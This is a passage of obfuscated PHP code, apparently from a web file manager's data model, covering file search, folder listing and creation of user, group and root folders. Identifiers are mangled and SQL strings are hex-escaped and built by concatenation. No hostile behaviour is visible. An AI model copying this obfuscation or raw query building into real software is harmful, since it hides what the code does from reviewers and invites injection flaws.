$Ï¬ßø©Ò[12], $Ï¬ßø©Ò[402]); $this->_listSearchMerge($äáÍ¯ô¢, $ùßÆ–ï², $‹÷€±ù, $¢ü…¾Ç); } private function _listSearchGroupTag(&$È¯ŒşÙ‘, $–·ôÚÑÚ, $¥Èœ³ù ) { $îÚ“’Ò“ =& $_SERVER[³·—™¤¢]; if (!$–·ôÚÑÚ[$îÚ“’Ò“[1946]] || $È¯ŒşÙ‘[$îÚ“’Ò“[366]][$îÚ“’Ò“[353]] > 1 || !$–·ôÚÑÚ[$îÚ“’Ò“[432]]) { return; } $ÙŸô¼‘ = $this->sourceInfo($–·ôÚÑÚ[$îÚ“’Ò“[432]]); if (!$ÙŸô¼‘ || $ÙŸô¼‘[$îÚ“’Ò“[411]] != SourceModel::TYPE_GROUP) { return; } $’×½ÒÓÛ = $ÙŸô¼‘[$îÚ“’Ò“[505]]; $šœØŠ½‡ = Model($îÚ“’Ò“[2108])->get($’×½ÒÓÛ); $¶º‚†Ä = array(); $ÍèÅçİ» = $–·ôÚÑÚ[$îÚ“’Ò“[1946]]; foreach ($šœØŠ½‡[$îÚ“’Ò“[369]] as $§æüÊŠ¢) { $—¯˜è’— = $§æüÊŠ¢[$îÚ“’Ò“[32]]; $È¶í™¯ = str_replace($îÚ“’Ò“[53], $îÚ“’Ò“[12], Pinyin::get($—¯˜è’—)); if (stripos($—¯˜è’—, $ÍèÅçİ») !== !1 || stripos($È¶í™¯, $ÍèÅçİ») !== !1) { $¶º‚†Ä[] = $§æüÊŠ¢[$îÚ“’Ò“[399]]; } } if (!$¶º‚†Ä) { return; } $’¹ªÕãÁ = array($îÚ“’Ò“[426] => array($îÚ“’Ò“[7], $¶º‚†Ä), $îÚ“’Ò“[1680] => 0, $îÚ“’Ò“[33] => $îÚ“’Ò“[1968] . $’×½ÒÓÛ); $‘¶‚Œ­ = Model($îÚ“’Ò“[428])->field($îÚ“’Ò“[84])->where($’¹ªÕãÁ)->select(); $‘¶‚Œ­ = array_to_keyvalue($‘¶‚Œ­, $îÚ“’Ò“[12], $îÚ“’Ò“[84]); $Å·ƒôˆ» = array_unique($‘¶‚Œ­); $this->_listSearchMerge($È¯ŒşÙ‘, $–·ôÚÑÚ, $¥Èœ³ù , $Å·ƒôˆ»); } private function _listSearchMerge(&$ó…Â¾âÒ, $Øê­Êîê, $»„û‘¤Æ, $‰®•óŒ…) { $·ùÑ‚Ê½ =& $_SERVER[³·—™¤¢]; if (!$‰®•óŒ…) { return; } $À àà˜‚ = array_to_keyvalue($ó…Â¾âÒ[$·ùÑ‚Ê½[369]], $·ùÑ‚Ê½[12], $·ùÑ‚Ê½[402]); $µ¼¼ë•† = array_diff($‰®•óŒ…, $À àà˜‚); if (!$µ¼¼ë•†) { return; } $Å½ı‹İ = array($·ùÑ‚Ê½[402] => array($·ùÑ‚Ê½[7], $µ¼¼ë•†)); $×£ÅŞ†ñ = $this->field($»„û‘¤Æ)->where($Å½ı‹İ)->select(); if (!$×£ÅŞ†ñ) { return; } $æÁ«áÉ = array(); foreach ($×£ÅŞ†ñ as $¶‹«å³ü) { if ($this->_listSearchFilter($¶‹«å³ü, $Øê­Êîê)) { $æÁ«áÉ[] = $¶‹«å³ü; } } $ó…Â¾âÒ[$·ùÑ‚Ê½[369]] = array_merge($æÁ«áÉ, $ó…Â¾âÒ[$·ùÑ‚Ê½[369]]); $ó…Â¾âÒ[$·ùÑ‚Ê½[366]][$·ùÑ‚Ê½[367]] += count($æÁ«áÉ); } private function _listSearchFilter($Ï –„”€, $é¾ˆêúú) { $Ôñ›ÈÀ§ =& $_SERVER[³·—™¤¢]; $»†ÅùÉ£ = $Ï –„”€[$Ôñ›ÈÀ§[410]] == $Ôñ›ÈÀ§[88]; if (!strstr($Ï –„”€[$Ôñ›ÈÀ§[521]], $Ôñ›ÈÀ§[50] . $é¾ˆêúú[$Ôñ›ÈÀ§[432]] . $Ôñ›ÈÀ§[50])) { return !1; } if (isset($é¾ˆêúú[$Ôñ›ÈÀ§[412]]) && $é¾ˆêúú[$Ôñ›ÈÀ§[412]] != $Ôñ›ÈÀ§[1907]) { if ($é¾ˆêúú[$Ôñ›ÈÀ§[412]] == $Ôñ›ÈÀ§[75] && !$»†ÅùÉ£) { return !1; } if ($é¾ˆêúú[$Ôñ›ÈÀ§[412]] != $Ôñ›ÈÀ§[75] && $»†ÅùÉ£) { return !1; } if (!strstr($Ï –„”€[$Ôñ›ÈÀ§[174]], $Ôñ›ÈÀ§[50] . $é¾ˆêúú[$Ôñ›ÈÀ§[412]] . $Ôñ›ÈÀ§[50])) { return !1; } } if (isset($é¾ˆêúú[$Ôñ›ÈÀ§[2109]]) && $é¾ˆêúú[$Ôñ›ÈÀ§[2109]] < $Ï –„”€[$Ôñ›ÈÀ§[76]]) { return !1; } if (isset($é¾ˆêúú[$Ôñ›ÈÀ§[2110]]) && $é¾ˆêúú[$Ôñ›ÈÀ§[2110]] > $Ï –„”€[$Ôñ›ÈÀ§[76]]) { return !1; } if (isset($é¾ˆêúú[$Ôñ›ÈÀ§[600]]) && $é¾ˆêúú[$Ôñ›ÈÀ§[600]] != $Ï –„”€[$Ôñ›ÈÀ§[456]]) { return !1; } return !0; } public function listSearchChildren($š²Š»ş, $øÙşÈŠ‚ = 5000) { $„ïôêĞÆ =& $_SERVER[³·—™¤¢]; $–ÑùÌŒì = array(); $†Ô¹àÑ = $this->sourceInfo($š²Š»ş); $¸êò–Æ = array($„ïôêĞÆ[521] => array($„ïôêĞÆ[383], $†Ô¹àÑ[$„ïôêĞÆ[521]] . $†Ô¹àÑ[$„ïôêĞÆ[402]] . $„ïôêĞÆ[551])); $÷•¯š‘ = $this->field($„ïôêĞÆ[76])->where($¸êò–Æ)->limit($øÙşÈŠ‚ + 1)->select(); $óÕ„ÍĞ = is_array($÷•¯š‘) ? count($÷•¯š‘) : 0; if ($óÕ„ÍĞ > $øÙşÈŠ‚) { return $this->_listSearchChildrenNear($š²Š»ş, $øÙşÈŠ‚); } $§¤ˆ¹¯¤ = $this->field($„ïôêĞÆ[402])->where($¸êò–Æ)->select(); $–ÑùÌŒì = array_to_keyvalue($§¤ˆ¹¯¤, $„ïôêĞÆ[12], $„ïôêĞÆ[402]); return $–ÑùÌŒì; } private function _listSearchChildrenNear($áìÆ€’Ô, $§¯Ö¿É±) { $²³¨İëì =& $_SERVER[³·—™¤¢]; $¹Ô¢¬àå = array(); $—úôº´¬ = array($²³¨İëì[432] => $áìÆ€’Ô); $òãÆİ• = $this->field($²³¨İëì[2111])->where($—úôº´¬)->select(); $àğí„ÈÎ = array_to_keyvalue(array_filter_by_field($òãÆİ•, $²³¨İëì[410], $²³¨İëì[88]), $²³¨İëì[12], $²³¨İëì[402]); $¹Ô¢¬àå = array_merge($¹Ô¢¬àå, array_to_keyvalue($òãÆİ•, $²³¨İëì[12], $²³¨İëì[402])); if (!$àğí„ÈÎ) { return $¹Ô¢¬àå; } $—úôº´¬ = array($²³¨İëì[432] => array($²³¨İëì[7], $àğí„ÈÎ)); $òãÆİ• = $this->field($²³¨İëì[2111])->where($—úôº´¬)->limit($§¯Ö¿É±)->select(); $¹Ô¢¬àå = array_merge($¹Ô¢¬àå, array_to_keyvalue($òãÆİ•, $²³¨İëì[12], $²³¨İëì[402])); $¹Ô¢¬àå = array_slice($¹Ô¢¬àå, 0, $§¯Ö¿É±); return $¹Ô¢¬àå; } private function _listSearchBindPinyin($»•ˆµ±, &$ä´Ùæãê, &$ô¸Õ™Õ¯) { $Ã»Ò…Ô =& $_SERVER[³·—™¤¢]; if (!isset($»•ˆµ±[$Ã»Ò…Ô[1946]]) || !$»•ˆµ±[$Ã»Ò…Ô[1946]]) { return; } if (!Input::check($»•ˆµ±[$Ã»Ò…Ô[1946]], $Ã»Ò…Ô[318]) || strlen($»•ˆµ±[$Ã»Ò…Ô[1946]]) < 2) { return; } $ß°§ÃÇê = "\114\105\106\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\163\x6f\165\x72\143\x65\137\x6d\145\x74\141\40\155\145\164\141\x20\x6f\156\x20\163\157\x75\x72\x63\145\56\x73\x6f\165\162\x63\145\x49\104\x20\x3d\40\x6d\145\x74\141\x2e\163\157\165\x72\x63\145\111\x44"; $õşöó°Š = array(); $ô¸Õ™Õ¯ = str_replace(array($Ã»Ò…Ô[231], $Ã»Ò…Ô[53], $Ã»Ò…Ô[2112]), $Ã»Ò…Ô[12], $ô¸Õ™Õ¯); $ô¸Õ™Õ¯ = $Ã»Ò…Ô[438] . str_replace($Ã»Ò…Ô[50], $Ã»Ò…Ô[439], $ô¸Õ™Õ¯); $¾¹úÇËë = $ä´Ùæãê[$Ã»Ò…Ô[32]]; unset($ä´Ùæãê[$Ã»Ò…Ô[32]]); foreach ($ä´Ùæãê as $ãœğ›…ü => $Öù¤óí) { $õşöó°Š[$Ã»Ò…Ô[438] . $ãœğ›…ü] = $Öù¤óí; } foreach ($¾¹úÇËë as $×çıææÁ) { $õşöó°Š[] = array($Ã»Ò…Ô[443] => $×çıææÁ, $Ã»Ò…Ô[1023] => $Ã»Ò…Ô[1950], array($Ã»Ò…Ô[2113] => $×çıææÁ, $Ã»Ò…Ô[2114] => array($Ã»Ò…Ô[7], array($Ã»Ò…Ô[465], $Ã»Ò…Ô[464])))); } $this->join($ß°§ÃÇê); $ä´Ùæãê = $õşöó°Š; } private function _parseSearchWhere($ñú”Ñ»†) { $ü†ŠÔÄ =& $_SERVER[³·—™¤¢]; $­ø»® = array(); if (isset($ñú”Ñ»†[$ü†ŠÔÄ[781]]) && $ñú”Ñ»†[$ü†ŠÔÄ[781]]) { $­ø»®[$ü†ŠÔÄ[85]] = array($ü†ŠÔÄ[2115], $ñú”Ñ»†[$ü†ŠÔÄ[781]]); } if (isset($ñú”Ñ»†[$ü†ŠÔÄ[497]]) && $ñú”Ñ»†[$ü†ŠÔÄ[497]]) { $‰¬ÇŒÅÓ = array($ü†ŠÔÄ[2116], $ñú”Ñ»†[$ü†ŠÔÄ[497]]); if ($­ø»®[$ü†ŠÔÄ[85]]) { $­ø»®[$ü†ŠÔÄ[85]] = array($­ø»®[$ü†ŠÔÄ[85]], $‰¬ÇŒÅÓ, $ü†ŠÔÄ[2117]); } else { $­ø»®[$ü†ŠÔÄ[85]] = $‰¬ÇŒÅÓ; } } if (isset($ñú”Ñ»†[$ü†ŠÔÄ[2109]]) && $ñú”Ñ»†[$ü†ŠÔÄ[2109]] > 0) { $­ø»®[$ü†ŠÔÄ[76]] = array($ü†ŠÔÄ[2115], $ñú”Ñ»†[$ü†ŠÔÄ[2109]]); } if (isset($ñú”Ñ»†[$ü†ŠÔÄ[2110]]) && $ñú”Ñ»†[$ü†ŠÔÄ[2110]]) { $‰¬ÇŒÅÓ = array($ü†ŠÔÄ[2116], $ñú”Ñ»†[$ü†ŠÔÄ[2110]]); if ($­ø»®[$ü†ŠÔÄ[76]]) { $­ø»®[$ü†ŠÔÄ[76]] = array($­ø»®[$ü†ŠÔÄ[76]], $‰¬ÇŒÅÓ, $ü†ŠÔÄ[2117]); } else { $­ø»®[$ü†ŠÔÄ[76]] = $‰¬ÇŒÅÓ; } } if (isset($ñú”Ñ»†[$ü†ŠÔÄ[600]]) && $ñú”Ñ»†[$ü†ŠÔÄ[600]]) { $­ø»®[] = array($ü†ŠÔÄ[456] => $ñú”Ñ»†[$ü†ŠÔÄ[600]], $ü†ŠÔÄ[454] => $ñú”Ñ»†[$ü†ŠÔÄ[600]], $ü†ŠÔÄ[1023] => $ü†ŠÔÄ[1950]); } if (isset($ñú”Ñ»†[$ü†ŠÔÄ[412]]) && $ñú”Ñ»†[$ü†ŠÔÄ[412]]) { $Ôôú¥’Æ = $ñú”Ñ»†[$ü†ŠÔÄ[412]]; if ($Ôôú¥’Æ == $ü†ŠÔÄ[75]) { $­ø»®[$ü†ŠÔÄ[410]] = 1; } else { if ($Ôôú¥’Æ == $ü†ŠÔÄ[2118]) { $­ø»®[$ü†ŠÔÄ[410]] = 0; } else { if ($Ôôú¥’Æ) { $Ôôú¥’Æ = is_array($Ôôú¥’Æ) ? $Ôôú¥’Æ : explode($ü†ŠÔÄ[50], $Ôôú¥’Æ); $­ø»®[$ü†ŠÔÄ[412]] = array($ü†ŠÔÄ[418], $Ôôú¥’Æ); $­ø»®[$ü†ŠÔÄ[410]] = 0; } } } } $this->_parseSearchParent($ñú”Ñ»†, $­ø»®); if (isset($ñú”Ñ»†[$ü†ŠÔÄ[1946]]) && trim($ñú”Ñ»†[$ü†ŠÔÄ[1946]])) { $Şİ²˜È = trim($ñú”Ñ»†[$ü†ŠÔÄ[1946]]); $ô½í¹ğË = explode($ü†ŠÔÄ[53], $Şİ²˜È); if (strlen($Şİ²˜È) > 2 && (substr($Şİ²˜È, 0, 1) == $ü†ŠÔÄ[118] && substr($Şİ²˜È, -1) == $ü†ŠÔÄ[118]) || substr($Şİ²˜È, 0, 1) == $ü†ŠÔÄ[58] && substr($Şİ²˜È, -1) == $ü†ŠÔÄ[58]) { $Şİ²˜È = substr($Şİ²˜È, 1, -1); $ô½í¹ğË = array($Şİ²˜È); } $­ø»®[$ü†ŠÔÄ[32]] = array(array($ü†ŠÔÄ[550], $ü†ŠÔÄ[1948] . $Şİ²˜È . $ü†ŠÔÄ[1948])); if (count($ô½í¹ğË) > 1) { $­ø»®[$ü†ŠÔÄ[32]] = array(); foreach ($ô½í¹ğË as $¿Ê†µ×±) { if (!trim($¿Ê†µ×±)) { continue; } $­ø»®[$ü†ŠÔÄ[32]][] = array($ü†ŠÔÄ[550], $ü†ŠÔÄ[1948] . trim($¿Ê†µ×±) . $ü†ŠÔÄ[1948]); } } } return $­ø»®; } private function _parseSearchParent($—ÌŸè±˜, &$¡¶ü¶ ½) { $ÇÃïíª‘ =& $_SERVER[³·—™¤¢]; if (!isset($—ÌŸè±˜[$ÇÃïíª‘[432]]) || !$—ÌŸè±˜[$ÇÃïíª‘[432]]) { return; } $úµ±÷ù = $this->pathInfo($—ÌŸè±˜[$ÇÃïíª‘[432]]); $ğñ‰ºóÕ = $úµ±÷ù[$ÇÃïíª‘[432]] . $ÇÃïíª‘[12] === $ÇÃïíª‘[197]; $ÂÛÚ›ã… = $úµ±÷ù[$ÇÃïíª‘[411]] == $ÇÃïíª‘[515]; if ($úµ±÷ù[$ÇÃïíª‘[532]] == $ÇÃïíª‘[533]) { $İ×³Ï¡Ê = $this->sourceInfo($—ÌŸè±˜[$ÇÃïíª‘[432]]); $úµ±÷ù[$ÇÃïíª‘[521]] = $İ×³Ï¡Ê[$ÇÃïíª‘[521]]; } $¡¶ü¶ ½[$ÇÃïíª‘[590]] = array($ÇÃïíª‘[550], $úµ±÷ù[$ÇÃïíª‘[521]] . $—ÌŸè±˜[$ÇÃïíª‘[432]] . $ÇÃïíª‘[551]); $©éƒˆ†„ = isset($—ÌŸè±˜[$ÇÃïíª‘[1811]]) && in_array($ÇÃïíª‘[515], $—ÌŸè±˜[$ÇÃïíª‘[1811]]); if (!$©éƒˆ†„ || !$ÂÛÚ›ã… || !$ğñ‰ºóÕ || !$úµ±÷ù[$ÇÃïíª‘[413]]) { return; } if (!AuthModel::authCheckRoot($úµ±÷ù[$ÇÃïíª‘[413]][$ÇÃïíª‘[414]])) { return; } $´õˆûÔÃ = $úµ±÷ù[$ÇÃïíª‘[505]] . $ÇÃïíª‘[12]; if ($´õˆûÔÃ == $ÇÃïíª‘[88]) { unset($¡¶ü¶ ½[$ÇÃïíª‘[590]]); $¡¶ü¶ ½[$ÇÃïíª‘[411]] = self::TYPE_GROUP; return; } $ƒÖ´°ë± = Model($ÇÃïíª‘[522])->groupChildrenAll($´õˆûÔÃ); $É¯ëôÜÙ = count($ƒÖ´°ë±); if ($É¯ëôÜÙ <= 1) { return; } $ØíÂÚÍß = array($ÇÃïíª‘[432] => 0, $ÇÃïíª‘[411] => self::TYPE_GROUP, $ÇÃïíª‘[505] => array($ÇÃïíª‘[7], $ƒÖ´°ë±)); $ı²ŒŞ¯Ü = $this->field($ÇÃïíª‘[2119])->where($ØíÂÚÍß)->limit($É¯ëôÜÙ)->select(); $¡¶ü¶ ½[$ÇÃïíª‘[590]] = array(); foreach ($ı²ŒŞ¯Ü as $©ş…ÌÈ) { $¡¶ü¶ ½[$ÇÃïíª‘[590]][] = array($ÇÃïíª‘[550], $ÇÃïíª‘[531] . $©ş…ÌÈ[$ÇÃïíª‘[402]] . $ÇÃïíª‘[551]); } $¡¶ü¶ ½[$ÇÃïíª‘[590]][] = $ÇÃïíª‘[1950]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ï˜¼…•) { $×¤¾³—³ =& $_SERVER[³·—™¤¢]; $Ş¶ÖÅ³ = Model($×¤¾³—³[513])->where(array($×¤¾³—³[1671] => $ï˜¼…•))->find(); $£¶ÁÂ¹Š = $this->_mkdirRoot(SourceModel::TYPE_USER, $ï˜¼…•, $Ş¶ÖÅ³[$×¤¾³—³[32]]); $this->userDesktopAdd($£¶ÁÂ¹Š); return $£¶ÁÂ¹Š; } public function userDesktopAdd($ß‰³¥—â) { $áÉÜ÷ÎÁ =& $_SERVER[³·—™¤¢]; $Æ×óîÁ = LNG($áÉÜ÷ÎÁ[2120]); $ª£•‹° = $this->mkdir($ß‰³¥—â, $Æ×óîÁ); $this->metaSet($ª£•‹°, $áÉÜ÷ÎÁ[2121], $áÉÜ÷ÎÁ[88]); $this->metaSet($ß‰³¥—â, $áÉÜ÷ÎÁ[2122], $ª£•‹°); } public function userPathSafeAdd($¾æ§Äƒ) { $Å†©ÂÆ¸ =& $_SERVER[³·—™¤¢]; $‰Š‘å¦× = Model($Å†©ÂÆ¸[513])->getInfoFull($¾æ§Äƒ); if (!$‰Š‘å¦×) { return !1; } if (_get($‰Š‘å¦×, $Å†©ÂÆ¸[536])) { return $‰Š‘å¦×[$Å†©ÂÆ¸[466]][$Å†©ÂÆ¸[2123]]; } $¤£–—İ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¾æ§Äƒ, $Å†©ÂÆ¸[2124], $Å†©ÂÆ¸[433]); Model($Å†©ÂÆ¸[513])->metaSet($¾æ§Äƒ, $Å†©ÂÆ¸[2123], $¤£–—İ); $this->metaSet($¤£–—İ, $Å†©ÂÆ¸[2125], $¾æ§Äƒ); return $¤£–—İ; } public function groupRootAdd($Øìßœ«Í) { $‚¥Éúúî =& $_SERVER[³·—™¤¢]; $ÇÖ–“æÌ = Model($‚¥Éúúî[522])->where(array($‚¥Éúúî[1940] => $Øìßœ«Í))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Øìßœ«Í, $ÇÖ–“æÌ[$‚¥Éúúî[32]]); } public function systemRootPathAdd($‚ÔğãÛ¥) { if ($‚ÔğãÛ¥ != $_SERVER[³·—™¤¢][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‚ÔğãÛ¥); } public function userRootRemove($ØÏ¸§¬É) { $²‹ô¥ì™ = $this->sourceRoot(SourceModel::TYPE_USER, $ØÏ¸§¬É, !0); foreach ($²‹ô¥ì™ as $ÁŞ½ßÏ) { if (!$ÁŞ½ßÏ) { continue; } $this->remove($ÁŞ½ßÏ[$_SERVER[³·—™¤¢][402]], !1); } } public function groupRootRemove($ „«ş ) { $ôÛ›¨ª = $this->sourceRoot(SourceModel::TYPE_GROUP, $ „«ş ); if (!$ôÛ›¨ª) { return; } $this->remove($ôÛ›¨ª[$_SERVER[³·—™¤¢][402]], !1); } private function _mkdirRoot($„Î¬ò˜…, $ùğË¥¦³, $¯×µÜâ, $ßœ®É„Î = '') { $ÔÔÓ™Î =& $_SERVER[³·—™¤¢]; $¦™ÑàÖˆ = array($ÔÔÓ™Î[401] => 0, $ÔÔÓ™Î[586] => $„Î¬ò˜…, $ÔÔÓ™Î[587] => $ùğË¥¦³, $ÔÔÓ™Î[583] => 1, $ÔÔÓ™Î[588] => USER_ID, $ÔÔÓ™Î[589] => USER_ID, $ÔÔÓ™Î[584] => $ßœ®É„Î, $ÔÔÓ™Î[590] => $ÔÔÓ™Î[531], $ÔÔÓ™Î[430] => 0, $ÔÔÓ™Î[585] => 0, $ÔÔÓ™Î[469] => 0, $ÔÔÓ™Î[591] => $ÔÔÓ™Î[12]); if ($¾ß¸âíÕ = $this->where($¦™ÑàÖˆ)->find()) { return $¾ß¸âíÕ[$ÔÔÓ™Î[402]]; } $“ñ™œïÃ = "\115\157\144\x65\154\x53\157\x75\x72\x63\145\x2e\155\x6b\x64\x69\162\122\157\157\x74\56{$„Î¬ò˜…}\56{$ùğË¥¦³}\x2e" . $¯×µÜâ; CacheLock::lock($“ñ™œïÃ); $¦™ÑàÖˆ[$ÔÔÓ™Î[32]] = $¯×µÜâ; $Îâ¼óŞ = $this->add($¦™ÑàÖˆ); $÷­Ü„¯¬ = array($ÔÔÓ™Î[592] => short_id($Îâ¼óŞ)); $this->where(array($ÔÔÓ™Î[417] => $Îâ¼óŞ))->save($÷­Ü„¯¬); CacheLock::unlock($“ñ™œïÃ); return $Îâ¼óŞ; } private function sourceRoot($÷Šš”Ù, $‡¹Üé‡â, $×ì™ñ€ = false) { $­Éãß§ =& $_SERVER[³·—™¤¢]; $´³·¾¯æ = array($­Éãß§[401] => 0, $­Éãß§[586] => $÷Šš”Ù, $­Éãß§[587] => $‡¹Üé‡â); if ($×ì™ñ€) { $Ë§÷¦ô¤ = $this->where($´³·¾¯æ)->select(); return $Ë§÷¦ô¤ ? $Ë§÷¦ô¤ : array(); } $ôØ±„¬© = $this->where($´³·¾¯æ)->find(); return $ôØ±„¬© ? $ôØ±„¬© : array(); } public function sourceRootGroup($ìèË†ã½) { $Ê•°‡ş˜ =& $_SERVER[³·—™¤¢]; if (is_string($ìèË†ã½)) { $ìèË†ã½ = array($ìèË†ã½); } $Ş¦¡à€² = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ìèË†ã½, $Ê•°‡ş˜[188]); $Ü¼åÉ€ò = array($Ê•°‡ş˜[369] => $Ş¦¡à€², $Ê•°‡ş˜[366] => array($Ê•°‡ş˜[779] => count($ìèË†ã½))); $this->_listDataApply($Ü¼åÉ€ò[$Ê•°‡ş˜[369]]); $this->_listMake($Ü¼åÉ€ò); return array_to_keyvalue($Ü¼åÉ€ò[$Ê•°‡ş˜[82]], $Ê•°‡ş˜[505]); } public function mkfile($§ÑâûäÎ, $ù÷åÛ¨Á, $çË‰÷ûç = '', $ú‰ËŸ®¥ = REPEAT_RENAME) { $Á·çÕŠ“ =& $_SERVER[³·—™¤¢]; $İÄºÎºï = Model($Á·çÕŠ“[609])->addFileByContent($çË‰÷ûç, $ù÷åÛ¨Á); return $this->_createFileCall($§ÑâûäÎ, $ù÷åÛ¨Á, $İÄºÎºï, $ú‰ËŸ®¥, $Á·çÕŠ“[1361]); } public function addFile($÷’£ÓŸ“, $à‡¦’, $ÈÆˆú‡à, $¡Íµ¸Ğ½ = false, $÷Ëçù½ = REPEAT_RENAME) { $»€¡Õ£ = Model($_SERVER[³·—™¤¢][609])->addFile($à‡¦’, $ÈÆˆú‡à, $¡Íµ¸Ğ½); return $this->_createFileCall($÷’£ÓŸ“, $ÈÆˆú‡à, $»€¡Õ£, $÷Ëçù½); } public function addFileByFileID($°‹Á¨Øò, $ËŞÓœ“, $î£ø„ ê, $ñÑİëÎş = REPEAT_RENAME) { $¿şøÆ½é =& $_SERVER[³·—™¤¢]; $ˆ¾”‘Î´ = Model($¿şøÆ½é[609])->find($ËŞÓœ“); Model($¿şøÆ½é[609])->linkAdd($ËŞÓœ“); return $this->_createFileCall($°‹Á¨Øò, $î£ø„ ê, $ˆ¾”‘Î´, $ñÑİëÎş); } public function addFileByRemote($À´²÷µ, $Ûßó”’, $¶Äáùê¿, $ˆ÷×ôü· = array(), $ú®Åã´Ë = REPEAT_RENAME) { $œß©¨œæ = Model($_SERVER[³·—™¤¢][609])->addFileByRemote($Ûßó”’, $¶Äáùê¿, $ˆ÷×ôü·); return $this->_createFileCall($À´²÷µ, $¶Äáùê¿, $œß©¨œæ, $ú®Åã´Ë); } private function _createFileCall($´‡˜ìÜİ, $£•íËãè, $óïó µü, $ñí¨áó, $áêğÍ– = "\165\160\154\x6f\x61\144") { $ü´Šñµ =& $_SERVER[³·—™¤¢]; $æ ö£ı = !1; $this->setMasterDB(); $this->lockWriteStart($´‡˜ìÜİ, $£•íËãè); $‰£ÆÕ¬ = $this->fileNameExist($´‡˜ìÜİ, $£•íËãè); $Ò¾Äñéç = $this->_createFile($´‡˜ìÜİ, $£•íËãè, $óïó µü, $ñí¨áó, $æ ö£ı); if (!$æ ö£ı) { Model($ü´Šñµ[471])->remove($óïó µü[$ü´Šñµ[468]]); } if ($æ ö£ı && $Ò¾Äñéç && $Ò¾Äñéç != $‰£ÆÕ¬) { Model($ü´Šñµ[2093])->eventCreate($Ò¾Äñéç, $áêğÍ–); } $this->lockWriteEnd($´‡˜ìÜİ, $£•íËãè); return $Ò¾Äñéç; } public function mkdir($µõ…ÆøÊ, $üÌ„Ï½, $ëş€Ó€ = REPEAT_SKIP) { $ƒö¯ƒ =& $_SERVER[³·—™¤¢]; $this->setMasterDB(); $”¢î¯™Ç = $this->sourceInfo($µõ…ÆøÊ); if (!$”¢î¯™Ç) { return !1; } $this->lockWriteStart($µõ…ÆøÊ, $üÌ„Ï½); if ($ëş€Ó€ !== !1) { $¿¹ËüßÏ = $this->fileNameExist($µõ…ÆøÊ, $üÌ„Ï½); if ($¿¹ËüßÏ && $ëş€Ó€ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($µõ…ÆøÊ, $üÌ„Ï½); return $¿¹ËüßÏ; } $üÌ„Ï½ = $this->fileNameAuto($µõ…ÆøÊ, $üÌ„Ï½, $ëş€Ó€); } $Úø‹­¼Ã = array($ƒö¯ƒ[583] => 1, $ƒö¯ƒ[420] => $üÌ„Ï½, $ƒö¯ƒ[584] => $ƒö¯ƒ[12], $ƒö¯ƒ[469] => 0, $ƒö¯ƒ[585] => 0); $ÕİËğÍí = $this->_addSource($Úø‹­¼Ã, $”¢î¯™Ç); Model($ƒö¯ƒ[2093])->eventCreate($ÕİËğÍí, $ƒö¯ƒ[1362]); $this->lockWriteEnd($µõ…ÆøÊ, $üÌ„Ï½); return $ÕİËğÍí; } public function listSourceRoot($Î¨‹Èó¥, $ø®ıÖ¢©, $ìÜš¢º = "\x73\157\165\x72\x63\x65\111\104\54\x74\141\162\x67\x65\164\111\x44\54\x73\151\172\145") { $•ö‘µÍæ =& $_SERVER[³·—™¤¢]; $ÇÕ•ù˜— = $•ö‘µÍæ[378]; $×–Š´Ë = array(); $ª·ï¥„Â = 1024 * 50; $˜²™Ìõ€ = is_array($˜²™Ìõ€) ? $˜²™Ìõ€ : array(); $Ôğ´¦Íò = count($ø®ıÖ¢©); $•³¹ˆôê = $this->tablePrefix . $•ö‘µÍæ[2126]; for ($Ñ“™‰´û = 0; $Ñ“™‰´û < $Ôğ´¦Íò; $Ñ“™‰´û++) { $“©ªã– = $ø®ıÖ¢©[$Ñ“™‰´û]; $ÇÕ•ù˜— .= "\123\x45\x4c\x45\x43\124\x20\52\40\x46\122\x4f\x4d\40\50\x53\x45\114\105\103\124\x20{$ìÜš¢º}\40\x46\x52\117\115\40\x60{$•³¹ˆôê}\x60\40\127\x48\x45\122\105\40"; $ÇÕ•ù˜— .= "\140\x70\141\x72\145\156\164\x49\104\140\x3d\x30\40\101\x4e\104\40\x60\164\141\x72\x67\145\x74\111\x44\x60\75{$“©ªã–}\x20\101\x4e\x44\x20\x60\x74\x61\x72\147\x65\164\x54\171\160\145\140\x3d{$Î¨‹Èó¥}\x20\154\x69\155\151\164\40\61\x29\40\x61\163\x20\x74\142\x5f{$Ñ“™‰´û}\x20\x55\x4e\111\x4f\x4e\x20\101\x4c\x4c\40"; if ((strlen($ÇÕ•ù˜—) >= $ª·ï¥„Â || $Ñ“™‰´û == $Ôğ´¦Íò - 1) && $ÇÕ•ù˜—) { $ÇÕ•ù˜— = substr($ÇÕ•ù˜—, 0, -strlen($•ö‘µÍæ[1061])); $Ùˆú™ˆ™ = $this->query($ÇÕ•ù˜—); $ÇÕ•ù˜— = $•ö‘µÍæ[12]; $×–Š´Ë = array_merge($×–Š´Ë, $Ùˆú™ˆ™); } } return $×–Š´Ë; } private function _createFile($‰ó‚ïÕ, $ÆÎßÔš¯, $¤ı®á¡¨, $¬¸âòæ†, &$«Ø¢¿) { $’ìåìˆÏ =& $_SERVER[³·—™¤¢]; $­“å÷„„ = $this->sourceInfo($‰ó‚ïÕ); if (!$¤ı®á¡¨ || !$­“å÷„„) { return !1; } if ($¬¸âòæ† !== !1) { $ÀøÒøµÇ = $this->fileNameExist($‰ó‚ïÕ, $ÆÎßÔš¯); } $«Ø¢¿ = !0; if ($¬¸âòæ† && $ÀøÒøµÇ) { if ($¬¸âòæ† == REPEAT_SKIP) { $«Ø¢¿ = !1; return $ÀøÒøµÇ; } else { if ($¬¸âòæ† == REPEAT_REPLACE) { $ÓØàÓ‡ = $this->sourceInfo($ÀøÒøµÇ); $ˆÊİè–ù = $this->fileHistory($ÓØàÓ‡, $¤ı®á¡¨[$’ìåìˆÏ[468]], $¤ı®á¡¨[$’ìåìˆÏ[76]]); if (!$ˆÊİè–ù) { $«Ø¢¿ = !1; } else { $this->folderSizeReset($‰ó‚ïÕ); } return $ÀøÒøµÇ; } else { $ÆÎßÔš¯ = $this->fileNameAuto($‰ó‚ïÕ, $ÆÎßÔš¯, $¬¸âòæ†, !1); } } } $Ğç»©«ó = array($’ìåìˆÏ[583] => 0, $’ìåìˆÏ[420] => $ÆÎßÔš¯, $’ìåìˆÏ[584] => 